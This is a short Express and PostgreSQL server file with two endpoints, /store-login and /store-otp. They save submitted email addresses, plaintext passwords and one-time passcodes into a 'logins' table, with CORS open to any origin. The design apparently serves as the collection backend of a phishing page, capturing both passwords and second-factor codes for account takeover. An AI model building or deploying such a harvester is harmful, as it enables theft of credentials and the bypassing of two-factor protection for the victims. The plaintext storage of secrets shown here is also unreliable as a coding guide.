require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// PostgreSQL connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Create single table
const createTable = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        otp TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Tables are ready ✅");
  } catch (err) {
    console.error("Table creation error:", err);
  }
};
createTable();

// Store login (email + password)
app.post("/store-login", async (req, res) => {
  const { email, password } = req.body;

  try {
    const result = await pool.query(
      "INSERT INTO logins (email, password) VALUES ($1, $2) RETURNING id",
      [email, password]
    );

    res.json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("DB ERROR:", err);
    res.json({ success: false, error: err.message });
  }
});

// Store OTP
app.post("/store-otp", async (req, res) => {
  const { otp, email } = req.body;

  try {
    await pool.query(
      "UPDATE logins SET otp = $1 WHERE email = $2",
      [otp, email]
    );

    res.json({ success: true });
  } catch (err) {
    console.error("OTP DB ERROR:", err);
    res.json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
